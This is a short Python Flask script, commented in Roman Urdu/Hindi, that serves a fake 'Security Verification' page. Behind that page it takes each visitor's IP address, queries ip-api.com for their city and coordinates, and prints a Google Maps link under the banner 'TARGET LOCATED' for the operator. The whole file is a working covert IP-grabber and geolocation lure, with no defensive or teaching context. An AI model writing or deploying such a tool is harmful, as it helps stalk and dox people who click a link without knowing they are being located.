from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    # User ka asli IP nikalne ke liye ye line lazmi hai
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    try:
        # User ke IP se data nikalna
        res = requests.get(f'http://ip-api.com/json/{user_ip}').json()
        lat = res.get('lat')
        lon = res.get('lon')
        city = res.get('city', 'Unknown')
        
        # Exact Google Map link jo coordinates use kare
        map_link = f"https://www.google.com/maps?q={lat},{lon}" if lat else "Not Found"
            
    except:
        city, map_link = "Error", "Error"

    print(f"\n--- [!!!] TARGET LOCATED [!!!] ---")
    print(f"IP: {user_ip} | City: {city}")
    print(f"Exact Map: {map_link}\n")
    
    return "<h2>Security Verification...</h2><p>Connection stable. Please wait.</p>"
